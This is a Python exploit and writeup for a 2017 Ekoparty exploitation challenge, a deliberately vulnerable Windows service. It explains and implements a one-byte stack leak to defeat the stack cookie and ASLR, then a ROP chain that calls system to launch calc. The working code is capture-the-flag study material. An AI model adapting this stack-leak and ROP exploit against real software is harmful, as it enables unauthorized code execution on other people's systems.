#
# :.
# :: Exploit/Writeup for BFS Labs's Ekoparty Challenge
# ::
# :: URL: https://labs.bluefrostsecurity.de/blog/2017/08/02/bfs-ekoparty-exploitation-challenge/
# :.--------------------------------------------------------------------------------------------- :
# :.. By Asger Friis-Vigh of Rota Galaxy, August 2017 ............................................:
#
# I got to this challenge too late and could therefore not participate. However I found it fun to
# complete and decided to publish my solution.
#
# Thanks to @WanderingGlitch for his writeup which was very interesting.
#
#
# :: Foreword
# For this (and everything else related to reversing) I use IDA Pro. Both for static analyzes but
# also as a debugger (which I find excellent BTW.). But I'm sure you could follow in any debugger
# like Olly, x64dbg, r2, or even WinDbg.
#
#
# :: Overall
# It quickly becomes clear that the first menu is just a front with no real functionality. Once you
# answer anything it starts a listening socket on port 55555.
#
# After this a custom handshake ("Hello" -> "Hi") is made, then 4 bytes are required from us. The
# lower 16 bits of this will be used as the data length we're planning to send along. The higher
# 16 bits are then reduced/masked to 8 bits and used as an index (our value * 8) into an array
# in the application.
#
# First we notice how there's no boundary check, and the destination array (which is on the stack)
# is only 256 bytes. So we have a classic stack smash:
#
# .text:0342 0F B7 44 24 34          movzx   eax, word ptr [rsp+158h+buf]
# .text:0347 44 8B C0                mov     r8d, eax                        ; nSize
# .text:034A 48 8B 54 24 20          mov     rdx, [rsp+158h+pFrom]           ; pFrom
# .text:034F 48 8D 4C 24 40          lea     rcx, [rsp+158h+a256bufferForClientData] ; pTo
# .text:0354 E8 B7 FE FF FF          call    func_memcpy
#
#
# The selected index will then be treated like a function pointer. While inspecting the array, we
# see it's mostly 0x41, but also has exactly 2 entries that seem valid:
#
# .data:000000013F48132E 41                      db  41h ; A
# .data:000000013F48132F 41                      db  41h ; A
# .data:000000013F481330 00 10 47 3F 01 00 00 00 dq offset sub_13F471000 <-- Just a dummy function that calls
#                                                                            <IsBadReadPtr> using whatever
#                                                                            value we provide.
# .data:000000013F481338 41                      db  41h ; A
# .data:000000013F481339 41                      db  41h ; A
# ... and:
# .data:000000013F4817FE 41                      db  41h ; A
# .data:000000013F4817FF 41                      db  41h ; A
# .data:000000013F481800 38 17 47 3F 01 00 00 00 dq offset system
# .data:000000013F481808 41                      db 41h
# .data:000000013F481809 41                      db  41h ; A
#
# "system", really? No. Once we figure out that the higher 16 bits are masked out to only 8 bits
# then there's no way to reach the address of system. <system> is at 0x800, but we can only go as
# high as (0xFF * 8 =) 0x7F8. Instead we aim for sub_13F471000 which is at:
# (0x66*8) = 0x330
# Since our index is multiplied by 8 in the code, then we need to use index 0x66 to reach 0x330.
#
# So far so good. We've now figured out the protocol and have a stack smash. But this is a modern .exe
# and it has ASLR and Stack Cookies. What about a leak?
#
# Let's see the function up close:
# .text:0386 48 98                   cdqe
# .text:037C 0F B7 44 24 36          movzx   eax, [rsp+158h+nLower16bitsOfClientInputLength]
# .text:0381 25 FF 00 00 00          and     eax, 0FFh
# .text:0388 48 8D 0D 71 FC 00 00    lea     rcx, aAaaaaaaaaaaaaa            ; "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...
# .text:038F 48 8B 04 C1             mov     rax, [rcx+rax*8]
# .text:0393 48 89 44 24 28          mov     [rsp+158h+pApplicationAddressToCall], rax
# .text:0398 48 8D 4C 24 40          lea     rcx, [rsp+158h+a256bufferForClientData]
# .text:039D FF 54 24 28             call    [rsp+158h+pApplicationAddressToCall]
# .text:03A1 8B 44 24 30             mov     eax, [rsp+158h+nReceivedCountFromClient]
# .text:03A5 FF C0                   inc     eax
# .text:03A7 45 33 C9                xor     r9d, r9d                        ; flags
# .text:03AA 44 8B C0                mov     r8d, eax                        ; len
# .text:03AD 48 8D 54 24 40          lea     rdx, [rsp+158h+a256bufferForClientData] ; buf
# .text:03B2 48 8B 8C 24 60 01 00 00 mov     rcx, [rsp+158h+s]               ; s
# .text:03BA FF 15 B0 CE 00 00       call    cs:send
# .text:03C0
# .text:03C0                         loc_13F4713C0:                          ; CODE XREF: func_allocate_buffer_from_client_input__VULN+5Dj
# .text:03C0                                                                 ; func_allocate_buffer_from_client_input__VULN+75j ...
# .text:03C0 48 8B 8C 24 40 01 00 00 mov     rcx, [rsp+158h+nStackCookie]
# .text:03C8 48 33 CC                xor     rcx, rsp                        ; StackCookie
# .text:03CB E8 10 05 00 00          call    __security_check_cookie
# .text:03D0 48 81 C4 58 01 00 00    add     rsp, 158h
# .text:03D7 C3                      retn
# .text:03D7                         func_allocate_buffer_from_client_input__VULN endp
#
# It looks like unoptimized assembly - although not a complete DEBUG build, it's plain enough to
# be followed very easily:
# Take a look at 0x013F4713A5: Why is it increasing our length by 1?
# I guess this is the intended leaking VULN: It leaks 1 byte of the stack.
# To exploit this, we can simply save this returned array which always includes 1 byte more than we
# initially sent forward. That way we could leak the entire stack, from our frame and down to main.
# Instead we control ourselves and simply leak the stack cookie and what appears to be a pointer
# into the stack.
#

import sys, socket
from struct import *


hostIP = '172.16.0.1'
hostPORT = 55555


def recvuntil(s, t):
    p = ''
    while not p.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        p += tmp
    return p


def p8(x): return pack('<b', x)
def u8(x): return unpack('<b', x)[0]
def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]


#
# Prebuild initial message
#
helloMessageForServer  = "Hello" + (chr(0) * 3)
helloMessageForServer += p64(0x6565656565656565)                 # Random data just to aid debugging
helloMessageForServer += 'CALC' + (chr(0) * 4)                   # Our program to execute.
# Make the pattern recognizable. This could just as well be random data
for i in range(0, (4096 - 8 - 8 - 8) / 8) :
    helloMessageForServer += p64(0x8080808080808080 | i)




def SetupConnection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((hostIP, hostPORT))

    s.send(helloMessageForServer)

    handshakeReply = s.recv(4096)
    assert (handshakeReply == "Hi" + chr(0))

    return s


def LeakBytes(leakSize):
    result = ''

    # Notice that this is just a random number for <IsBadReadPtr> is evaluate.
    sendToServer = "ROTAGLXY" + ("C" * (256 - 8))

    while len(result) < leakSize :
        s = SetupConnection()

        # Server expects 4 bytes, which should be the length we're going to send over - but
        # that's only in the lower bits. The high 16 bits are used as a multiplier with 8 to
        # index into a place in .data that will then be used as a function pointer.
        # This is more like a crackme since it's a matter of finding the only right one, which
        # is 0x66 (see description in the top).
        #
        s.send( p32(0x00660000 + len(sendToServer)) )

        s.send( sendToServer )

        ourDataPlusOneByteLeak = s.recv(4096)

        assert( len(ourDataPlusOneByteLeak) == len(sendToServer) + 1 )

        # ProTip: Python array index -1 means the "last item"
        leakedByte = ourDataPlusOneByteLeak[-1]

        result += leakedByte
        sendToServer += leakedByte

        s.close()

    return unpack('%dQ' % (leakSize / 8), result[0:])



#
# Let's get started ...
#

#
# This is what our leaked stack looks like:
#
sizeOfWantedLeak  = 8       # Stack Cookie / Canary
sizeOfWantedLeak += 16      # Zeros
sizeOfWantedLeak += 8       # return RIP
sizeOfWantedLeak += 16      # Garbage
sizeOfWantedLeak += 8       # A pointer into the stack that's left there by previous functions.
                            # This can be used to calculate the actual RSP since the offset between
                            # this pointer and the actual RSP is always the same.


allLeakedBytes = LeakBytes(sizeOfWantedLeak)

leakedStackCookie = allLeakedBytes[0]

# Example stack:
# 000000000029E928  4343434343434343
# 000000000029E930  4343434343434343
# 000000000029E938  4343434343434343
# 000000000029E940  000017467CA7F7C6    <-- (Random) Stack cookie
# 000000000029E948  0000000000000000
# 000000000029E950  0000000000000000
# 000000000029E958  000000013FBD16F0  main+1E0  <-- Returning Address
# 000000000029E960  0000000000000058
# 000000000029E968  0000000000000000
# 000000000029E970  000000000029E778  Stack[00000858]:000000000029E778  <-- Some stack pointer
# 000000000029E978  0000000000000003
# 000000000029E980  0000000000000054
# 000000000029E988  0000000000000003
# 000000000029E990  0000000000000000
#
# main + 0x1E0 ==
# .text:000000013FBD16DF 8B 54 24 28             mov     edx, [rsp+1078h+addrlen]
# .text:000000013FBD16E3 48 8B 8C 24 60 10 00 00 mov     rcx, [rsp+1078h+nClientSocket]
# .text:000000013FBD16EB E8 90 FB FF FF          call    func_allocate_buffer_from_client_input__VULN
# .text:000000013FBD16F0 48 8D 0D C1 05 01 00    lea     rcx, loc_13FBE1CB8     <-- Notice the return address here
#
# Stat of .text segment is then:
# 000000013FBD1000
#
leakedReturnAddress = allLeakedBytes[3]

leakedBaseOfTextSegment = leakedReturnAddress - 0x6F0

# 0x2AE840 - 0x2AE7B8 = 136
leakedRSP = allLeakedBytes[6] + 136


#
# .text:0738
# .text:0738                ; int __cdecl system(const char *Command)
#
leakedSystemFunctionAddress = leakedBaseOfTextSegment + 0x738


# Now we want to put the string "CALC"+chr(0) onto the stack, and then have RCX point to this
# stack space since the call to <system> takes its first parameter in RCX (Windows x64 ABI).
#
# We do this by finding a ROP gadget using the Sploiter plugin for IDA Pro.
# That ROP gadget should ideally pop RCX and then RET. That should be feasible ...
#
# ... but it's not. But sometimes Sploiter isn't finding the same gadgets as the Python-
# -based "ROPgadget". So I dumped all gadgets (see "bfs_rop-gadget.txt"), but conclude
# that this one also cannot find a regular POP RCX: RET.
#
# So let's get creative, and search for anything useful that assigns to RCX ...
#
# So:
# .text:6CD4 48 8B CB                mov     rcx, rbx
# .text:6CD7 FF D0                   call    rax
# or:
# .text:6C85 48 8B C8                mov     rcx, rax
# .text:6C88 41 FF D4                call    r12
#
# So while not ideal, we need to fill RBX with the first argument ("calc.exe"), and
# fill RAX with the address of <system>. So we we chose the second option, we fill
# RAX and R12.
#
# Let's try with the first one. For that to work, let's find ROP gadgets that pop
# values into RAX & RBX. Those are usually present, but you never know.
#
# Sploiter says:
# .text:0xA03 pop rbx # retn
# .text:0x1AB pop rax # retn
#
# That's it
#


#
# We're now ready for the actual stack smash ...
#

sendToServer = p64(leakedSystemFunctionAddress) + ("C" * (256 - 8))
sendToServer += p64(leakedStackCookie)
sendToServer += p64(0)
sendToServer += p64(0)

sendToServer += p64(leakedBaseOfTextSegment + 0xA03)    # POP RBX; RET
sendToServer += p64(leakedRSP + 0x1D0)                  # Pointer to CALC (which we added in the Hello message. This is below us - so higher address)

sendToServer += p64(leakedBaseOfTextSegment + 0x1AB)    # POP RAX; RET
sendToServer += p64(leakedBaseOfTextSegment + 0x738)    # Pointer to the <system> function

sendToServer += p64(leakedBaseOfTextSegment + 0x6CD4)   # MOV RCX, RBX; CALL RAX


s = SetupConnection()

s.send(p32(0x00660000 + len(sendToServer)))

s.send(sendToServer)

ourDataPlusOneByteLeak = s.recv(4096)

s.close()
